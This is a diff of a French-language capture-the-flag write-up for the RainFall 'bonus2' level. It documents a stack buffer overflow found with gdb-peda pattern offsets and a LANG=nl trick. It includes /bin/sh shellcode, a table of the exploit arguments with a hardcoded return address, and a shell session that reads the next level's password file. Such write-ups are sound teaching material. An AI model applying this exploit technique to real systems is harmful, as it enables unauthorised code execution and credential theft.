@@ -1,23 +1,14 @@
+# Bonus 2
+- Quand on met un arg 1 de 40+ strncpy met un `\0` trop loin se qu'il fait qu'il est ecraser par arg2. Se qui fait que arg1 et arg2 sont une string
+- On voit donc dans cette exemple qu'on peut overwrite la Return Adress
 <pre>
 gdb-peda$ pattern create 200
-'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
-gdb-peda$ r $(python -c  "print('A' * 200)") 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
-Starting program: /home/alarm/rainfall/bonus2/Ressources/bonus2 $(python -c  "print('A' * 200)") 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AA'
+gdb-peda$ r $(python -c  "print('A' * 200)") 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AA'
 
 Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%AAsAABAA$AAnAACAA-AA(AADAA;A
 
 Program received signal SIGSEGV, Segmentation fault.
-[----------------------------------registers-----------------------------------]
-EAX: 0x4f ('O')
-EBX: 0xffffd3b0 ('A' <repeats 43 times>, "%AAsAABAA$AAnAACAA-AA(AADAA;A")
-ECX: 0xffffffff 
-EDX: 0xffffffff 
-ESI: 0xffffd3fc --> 0xffffdc6a ("en_US.UTF-8")
-EDI: 0xffffd3ac --> 0x1 
-EBP: 0x41414441 ('ADAA')
-ESP: 0xffffd360 ('A' <repeats 43 times>, "%AAsAABAA$AAnAACAA-AA(AADAA;A")
-EIP: 0x800413b
-EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
 [-------------------------------------code-------------------------------------]
 <strong>Invalid $PC address: 0x800413b</strong>
 [------------------------------------------------------------------------------]
@@ -28,20 +19,18 @@ gdb-peda$ pattern offset 'A;'
 <strong>A; found at offset: 29</strong>
 </pre>
 
-- Quand LANG est different en different de NULL alors var_60 est ecrit dans string
-- Sauf que vu qu'il y a deja un overide dans le strcpy de l'arg[1] les var_60 et var_38 sont considerer comme un seul argument
+- Quand LANG est different en different de NULL alors var_60 est ecrit dans env
+- Sauf que vu qu'il y a deja un overide dans le strcpy de l'arg[1]. Les arg_1 et arg_2 sont considerer comme un seul argument
+
 <pre>
 $> LANG=nl gdb ./bonus2 
-
 gdb-peda$ pattern create 40
 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'
 gdb-peda$ r $(python -c "print('A' * 40)") 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'
-Starting program: /home/alarm/rainfall/bonus2/Ressources/bonus2 $(python -c "print('A' * 40)") 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'
 
 Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%AAsAABAA$AAnAACAA-AA(AADAA;A
 
 [----------------------------------registers-----------------------------------]
-ESP: 0xffffd4d0 ("DAA;A")
 <strong>EIP: 0x41412841 ('A(AA')</strong>
 EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
 [-------------------------------------code-------------------------------------]
@@ -67,8 +56,17 @@ puts("Goedemiddag! 1\311\367\341Qh//shh/bin\211\343\260\013"...)                
 --- SIGSEGV (Segmentation fault) ---
 +++ killed by SIGSEGV +++
 </pre>
-- Du coup on peut lancer le programme avec les argument suivant
+- Et on peut lancer le programme avec les argument suivant
+
 | arg 1 | arg 2 |
 |-------|-------|
 | shellcode + `A` * 20 | `B` * 23 + `\x80\xf5\xff\xbf` |
+
 - On creer des .c car en python ca bug
+```
+bonus2@RainFall:~$ LANG=nl ./bonus2 $(/tmp/shell) $(/tmp/pat)
+Goedemiddag! 1���Qh//shh/bin���̀
+                               AAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
